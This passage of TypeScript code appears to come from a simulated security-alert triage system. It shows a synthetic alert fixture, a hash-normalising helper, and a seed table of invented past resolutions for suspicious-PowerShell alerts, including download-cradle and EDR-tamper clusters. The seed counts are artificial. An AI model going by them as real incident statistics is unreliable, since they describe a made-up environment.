    parentProcessName: "explorer.exe",
    destinationHost: null,
    worldKey: "synthetic",
  });
}

/** Derive a valid 64-hex hash for ad-hoc alerts that did not supply one. */
export function normalizeHash(input: string | undefined | null, fallbackSeed: string): string {
  const value = (input ?? "").trim().toLowerCase();
  if (/^[a-f0-9]{64}$/.test(value)) return value;
  return sha256Of(fallbackSeed);
}

export const HISTORY_SEED = [
  { alert_class: "process_execution.suspicious_powershell", cluster: "fleet_automation", resolution: "benign", cases: 41, label: "Fleet-wide DSC/automation baseline" },
  { alert_class: "process_execution.suspicious_powershell", cluster: "scheduled_maintenance", resolution: "benign", cases: 18, label: "Scheduled maintenance runbook" },
  { alert_class: "process_execution.suspicious_powershell", cluster: "authorized_admin_interactive", resolution: "benign", cases: 12, label: "Admin interactive signed script" },
  { alert_class: "process_execution.suspicious_powershell", cluster: "rule_overfire", resolution: "benign", cases: 9, label: "Rule over-fire on encoded commands" },
  { alert_class: "process_execution.suspicious_powershell", cluster: "download_cradle_stager", resolution: "malicious", cases: 6, label: "Office parent download cradle" },
  { alert_class: "process_execution.suspicious_powershell", cluster: "edr_sensor_tamper", resolution: "tamper", cases: 3, label: "EDR heartbeat gap covering event" },
] as const;
